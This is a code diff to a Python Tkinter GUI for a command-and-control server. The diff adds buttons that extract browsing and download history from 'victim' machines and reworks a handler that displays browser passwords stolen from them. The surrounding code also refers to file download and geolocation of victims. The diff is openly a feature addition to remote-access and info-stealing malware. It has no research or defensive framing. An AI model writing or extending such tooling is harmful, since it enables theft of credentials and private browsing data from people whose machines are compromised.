@@ -121,6 +121,18 @@ class C2ServerGUI:
                 "var_name": "browser_pass_btn"
             },
             {
+                "text": "Browser History",
+                "desc": "Extract browsing history from victim's browsers",
+                "command": self.get_browser_history,
+                "var_name": "browser_history_btn"
+            },
+            {
+                "text": "Browser Downloads",
+                "desc": "Extract download history from victim's browsers",
+                "command": self.get_browser_downloads,
+                "var_name": "browser_dl_btn"
+            },
+            {
                 "text": "Download File",
                 "desc": "Retrieve file from victim machine",
                 "command": self.download_file,
@@ -249,66 +261,60 @@ class C2ServerGUI:
         threading.Thread(target=geolocate_and_show, daemon=True).start()
 
     def get_browser_passwords(self):
-        """Retrieve and display browser passwords from victim machine"""
         try:
-            loading_win = tk.Toplevel(self.root)
-            loading_win.title("Extracting Passwords...")
-            loading_win.geometry("300x100")
-            loading_win.transient(self.root)
-            loading_win.grab_set()
+            self.log("Retrieving browser passwords...", "info")
+            passwords = self.c2.get_browser_password()
             
-            ttk.Label(
-                loading_win, 
-                text="Extracting saved passwords from browsers...\nThis may take a moment.", 
-                font=("Arial", 10),
-                justify=tk.CENTER
-            ).pack(pady=20)
-            
-            progress = ttk.Progressbar(loading_win, mode='indeterminate')
-            progress.pack(pady=10, fill=tk.X, padx=20)
-            progress.start()
-            loading_win.update()
-            
-            def extract_passwords():
-                try:
-                    # Get passwords from wrapper
-                    passwords = self.c2.get_browser_password()
-                    
-                    # Close loading window
-                    self.root.after(0, loading_win.destroy)
-                    
-                    if not passwords or passwords.strip() == "":
-                        self.root.after(0, lambda: messagebox.showinfo(
-                            "No Passwords Found",
-                            "No saved browser passwords were found on the victim machine."
-                        ))
-                        self.root.after(0, lambda: self.log("No browser passwords found", "info"))
-                        return
-                    
-                    self.root.after(0, lambda: self._show_browser_passwords(passwords))
-                    self.root.after(0, lambda: self.log("Browser passwords extracted successfully", "success"))
-                    
-                except Exception as e:
-                    self.root.after(0, loading_win.destroy)
-                    error_msg = f"Failed to extract passwords: {e}"
-                    self.root.after(0, lambda: messagebox.showerror("Error", error_msg))
-                    self.root.after(0, lambda: self.log(error_msg, "error"))
-            
-            threading.Thread(target=extract_passwords, daemon=True).start()
-            
+            if passwords:
+                self._show_text_window("Browser Passwords", passwords)
+                self.log("Browser passwords retrieved", "success")
+            else:
+                self.log("No browser passwords found", "info")
+                messagebox.showinfo("Browser Passwords", "No saved passwords found")
+                
         except Exception as e:
-            self.log(f"Browser password error: {e}", "error")
+            self.log(f"Browser passwords error: {e}", "error")
             messagebox.showerror("Error", f"Failed to retrieve browser passwords:\n{e}")
 
-    def _show_browser_passwords(self, passwords):
-        """Display browser passwords in a new window"""
-        pw_window = tk.Toplevel(self.root)
-        pw_window.title("Browser Passwords")
-        pw_window.geometry("900x600")
-        pw_window.minsize(700, 400)
+    def get_browser_history(self):
+        try:
+            self.log("Retrieving browser history...", "info")
+            history = self.c2.get_browser_history()
+            
+            if history:
+                self._show_text_window("Browser History", history)
+                self.log("Browser history retrieved", "success")
+            else:
+                self.log("No browser history found", "info")
+                messagebox.showinfo("Browser History", "No browsing history found")
+                
+        except Exception as e:
+            self.log(f"Browser history error: {e}", "error")
+            messagebox.showerror("Error", f"Failed to retrieve browser history:\n{e}")
+
+    def get_browser_downloads(self):
+        try:
+            self.log("Retrieving browser downloads...", "info")
+            downloads = self.c2.get_browser_downloads()
+            
+            if downloads:
+                self._show_text_window("Browser Downloads", downloads)
+                self.log("Browser downloads retrieved", "success")
+            else:
+                self.log("No browser downloads found", "info")
+                messagebox.showinfo("Browser Downloads", "No download history found")
+                
+        except Exception as e:
+            self.log(f"Browser downloads error: {e}", "error")
+            messagebox.showerror("Error", f"Failed to retrieve browser downloads:\n{e}")
+
+    def _show_text_window(self, title, content):
+        """Display text content in a new window"""
+        text_window = tk.Toplevel(self.root)
+        text_window.title(title)
+        text_window.geometry("900x600")
         
-        # Main frame
-        main_frame = ttk.Frame(pw_window, padding=10)
+        main_frame = ttk.Frame(text_window, padding=10)
         main_frame.pack(fill=tk.BOTH, expand=True)
         
         # Header
@@ -316,57 +322,45 @@ class C2ServerGUI:
         header_frame.pack(fill=tk.X, pady=(0, 10))
         
         ttk.Label(
-            header_frame,
-            text="Extracted Browser Passwords",
+            header_frame, 
+            text=title, 
             font=("Arial", 12, "bold")
         ).pack(side=tk.LEFT)
         
-        # Count passwords
-        password_count = passwords.count("URL:") if "URL:" in passwords else len([l for l in passwords.split('\n') if l.strip()])
-        
-        ttk.Label(
-            header_frame,
-            text=f"Found: {password_count} entries",
-            font=("Arial", 10),
-            foreground="gray"
-        ).pack(side=tk.RIGHT)
-        
-        # Text widget with scrollbar
-        text_frame = ttk.Frame(main_frame)
-        text_frame.pack(fill=tk.BOTH, expand=True)
-        
+        # Text display
         text_widget = scrolledtext.ScrolledText(
-            text_frame,
+            main_frame,
             wrap=tk.WORD,
-            font=("Consolas", 10),
+            font=("Consolas", 9),
             state=tk.NORMAL
         )
-        text_widget.pack(fill=tk.BOTH, expand=True)
+        text_widget.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
         
-        # Insert passwords with formatting
-        text_widget.insert(tk.END, passwords)
+        text_widget.insert(tk.END, content)
         text_widget.config(state=tk.DISABLED)
         
-        # Configure tags for better readability
-        text_widget.tag_config("url", foreground="#4A9EFF", font=("Consolas", 10, "bold"))
-        text_widget.tag_config("username", foreground="#50C878")
-        text_widget.tag_config("password", foreground="#FFD700")
-        
-        # Button frame
+        # Buttons
         btn_frame = ttk.Frame(main_frame)
-        btn_frame.pack(fill=tk.X, pady=(10, 0))
-
+        btn_frame.pack(fill=tk.X)
+        
         def copy_to_clipboard():
-            self.root.clipboard_clear()
-            self.root.clipboard_append(passwords)
-            self.log("Passwords copied to clipboard", "info")
-            messagebox.showinfo("Copied", "Passwords copied to clipboard!")
+            text_window.clipboard_clear()
+            text_window.clipboard_append(content)
+            messagebox.showinfo("Copied", "Content copied to clipboard")
         
-        copy_btn = ttk.Button(btn_frame, text="Copy to Clipboard", command=copy_to_clipboard, width=20)
-        copy_btn.pack(side=tk.LEFT, padx=5)
+        ttk.Button(
+            btn_frame,
+            text="📋 Copy to Clipboard",
+            command=copy_to_clipboard,
+            width=20
+        ).pack(side=tk.LEFT, padx=5)
         
-        close_btn = ttk.Button(btn_frame, text="Close", command=pw_window.destroy, width=20)
-        close_btn.pack(side=tk.LEFT, padx=5)
+        ttk.Button(
+            btn_frame,
+            text="✖ Close",
+            command=text_window.destroy,
+            width=20
+        ).pack(side=tk.LEFT, padx=5)
             
     def log(self, message, level="info"):
         self.log_text.config(state=tk.NORMAL)
@@ -414,6 +408,8 @@ class C2ServerGUI:
         self.upload_btn.config(state=tk.NORMAL)
         self.location_btn.config(state=tk.NORMAL)
         self.browser_pass_btn.config(state=tk.NORMAL)
+        self.browser_history_btn.config(state=tk.NORMAL)
+        self.browser_dl_btn.config(state=tk.NORMAL)
         
         
     def _disable_commands(self):
@@ -424,6 +420,8 @@ class C2ServerGUI:
         self.upload_btn.config(state=tk.DISABLED)
         self.location_btn.config(state=tk.DISABLED)
         self.browser_pass_btn.config(state=tk.DISABLED)
+        self.browser_history_btn.config(state=tk.DISABLED)
+        self.browser_dl_btn.config(state=tk.DISABLED)
         
         
     def stop_server(self):
